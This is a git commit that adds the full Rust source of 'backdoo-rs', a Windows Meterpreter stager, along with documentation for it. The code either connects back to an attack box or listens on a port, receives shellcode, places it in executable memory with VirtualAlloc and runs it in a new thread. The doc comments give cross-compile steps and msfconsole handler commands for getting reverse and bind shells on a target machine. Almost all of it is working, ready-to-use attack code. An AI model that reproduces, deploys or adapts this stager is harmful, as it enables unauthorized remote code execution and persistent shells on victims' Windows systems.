98181e6e3af297cd28939180e6f85230133ffc33
raptor <raptor@0xdeadbeef.info>
2024-07-11 09:48:08 +0200

    First commit

---
+++ src/backdoo.rs
@@ -0,0 +1,98 @@
+use std::error::Error;
+use std::io::BufReader;
+use std::io::Read;
+use std::net::{TcpListener, TcpStream};
+use std::os::windows::io::AsRawSocket;
+use windows::Win32::System::{Memory::*, Threading::*};
+
+/// Implement the main logic of the program
+pub fn run(addr: String) -> Result<(), Box<dyn Error>> {
+    let stream = match addr.starts_with(':') {
+        // Start a bind_tcp stager
+        true => {
+            let addr = format!("0.0.0.0{addr}");
+            println!("Using bind_tcp stager ({})", addr);
+            let listener = TcpListener::bind(&addr)?;
+            let (stream, _) = listener.accept()?;
+            stream
+        }
+
+        // Start a reverse_tcp stager
+        false => {
+            println!("Using reverse_tcp stager ({})", addr);
+            TcpStream::connect(&addr)?
+        }
+    };
+
+    // Receive and execute the payload
+    let payload = payload_recv(&stream)?;
+    payload_exec(payload);
+
+    Ok(())
+}
+
+/// Print usage information
+pub fn usage(prog: &str) {
+    println!("Usage:");
+    println!("{prog} [:port | host:port]");
+    println!("\nExamples:");
+    println!("{prog} :4444");
+    println!("{prog} 192.168.0.66:4444");
+}
+
+/// Receive a Meterpreter payload via TCP
+fn payload_recv(stream: &TcpStream) -> Result<Vec<u8>, Box<dyn Error>> {
+    let mut reader = BufReader::new(stream);
+
+    // Read the 4-byte payload length and allocate payload buffer
+    let mut tmp = [0u8; 4];
+    reader.read_exact(&mut tmp)?;
+    let length = u32::from_le_bytes(tmp);
+    let mut payload = vec![0u8; length as usize + 5];
+
+    // Prepend some ASM to MOV the socket handle into EDI
+    // MOV EDI, 0x12345678 ; BF 78 56 34 12
+    let fd = stream.as_raw_socket() as u32;
+    payload[0] = 0xbf;
+    payload[1..5].copy_from_slice(&fd.to_le_bytes());
+
+    // Finish reading the payload
+    reader.read_exact(&mut payload[5..])?;
+    Ok(payload)
+}
+
+/// Execute a Windows payload
+fn payload_exec(payload: Vec<u8>) {
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_RESERVE: u32 = 0x2000;
+    const INFINITE: u32 = 0xFFFFFFFF;
+
+    // Get a pointer to RWX memory
+    let ptr = unsafe {
+        VirtualAlloc(
+            None,
+            payload.len(),
+            VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT | MEM_RESERVE),
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
+    if ptr.is_null() {
+        eprintln!("Error: Failed to allocate memory for payload");
+        return;
+    }
+
+    // Copy and execute the payload
+    unsafe {
+        std::ptr::copy_nonoverlapping(payload.as_ptr(), ptr as *mut u8, payload.len());
+        let _ = CreateThread(
+            None,
+            0,
+            Some(std::mem::transmute(ptr)),
+            None,
+            THREAD_CREATION_FLAGS(0),
+            None,
+        );
+        // Wait for the thread to finish running
+        let _ = WaitForSingleObject(GetCurrentThread(), INFINITE);
+    }
+}
---
+++ src/main.rs
@@ -0,0 +1,101 @@
+//!
+//! backdoo-rs - A simple Meterpreter stager written in Rust  
+//! Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>
+//!
+//! > "Launch the Polaris  
+//! > The end doesn't scare us  
+//! > When will this cease?  
+//! > The warheads will all rust in peace"  
+//! > -- Megadeth, Rust in Peace... Polaris (1990)
+//!
+//! Minimalistic Rust implementation of the main staging protocols used by the Metasploit Framework.
+//! Start an exploit/multi/handler instance on the attack box configured to handle one of the supported
+//! payloads, run backdoo-rs.exe on the target Windows system, and enjoy your session!
+//!
+//! # See also
+//! [letmein.py](https://github.com/0xdea/tactical-exploitation/blob/master/letmein.py)  
+//! [letmein.ps1](https://github.com/0xdea/tactical-exploitation/blob/master/letmein.ps1)  
+//! [letme.go](https://github.com/0xdea/tactical-exploitation/blob/master/letme.go)  
+//!
+//! # Cross-compiling
+//! ```sh
+//! [macOS example]
+//! $ brew install mingw-w64
+//! $ rustup target add x86_64-pc-windows-gnu
+//! $ cargo build --release --target x86_64-pc-windows-gnu
+//! ```
+//!
+//! # Usage
+//! ```sh
+//! C:\> backdoo-rs.exe [:port | host:port]
+//! ```
+//!
+//! # Examples
+//! Reverse shell:
+//! ```sh
+//! [on the attack box]
+//! $ msfconsole
+//! msf > use exploit/multi/handler
+//! msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+//! msf > set LHOST 192.168.0.66
+//! msf > exploit
+//! [on the target box]
+//! C:\> backdoo-rs.exe 192.168.0.66:4444
+//! ```
+//! 
+//! Bind shell:
+//! ```sh
+//! [on the target box]
+//! C:\> backdoo-rs.exe :4444
+//! [on the attack box]
+//! $ msfconsole
+//! msf > use exploit/multi/handler
+//! msf > set PAYLOAD windows/x64/meterpreter/bind_tcp
+//! msf > set RHOST 192.168.0.20
+//! msf > exploit
+//! ```
+//!
+//! # Supported payloads
+//! * windows/x64/meterpreter/reverse_tcp
+//! * windows/x64/meterpreter/bind_tcp
+//!
+//! # Tested on
+//! * Microsoft Windows 11
+//!
+
+use std::env;
+use std::process;
+
+mod backdoo;
+use backdoo::*;
+
+fn main() {
+    println!("backdoo-rs - A simple Meterpreter stager written in Rust");
+    println!("Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>");
+    println!();
+
+    // Parse command line arguments
+    let args: Vec<String> = env::args().collect();
+    let addr = match args.len() {
+        1 => ":4444".to_string(),
+        2 => args[1].clone(),
+        _ => {
+            usage(&args[0]);
+            process::exit(1);
+        }
+    };
+
+    if addr.starts_with('-') {
+        usage(&args[0]);
+        process::exit(1);
+    }
+
+    // Let's do it
+    match run(addr) {
+        Ok(()) => (),
+        Err(err) => {
+            eprintln!("Error: {}", err);
+            process::exit(1);
+        }
+    }
+}
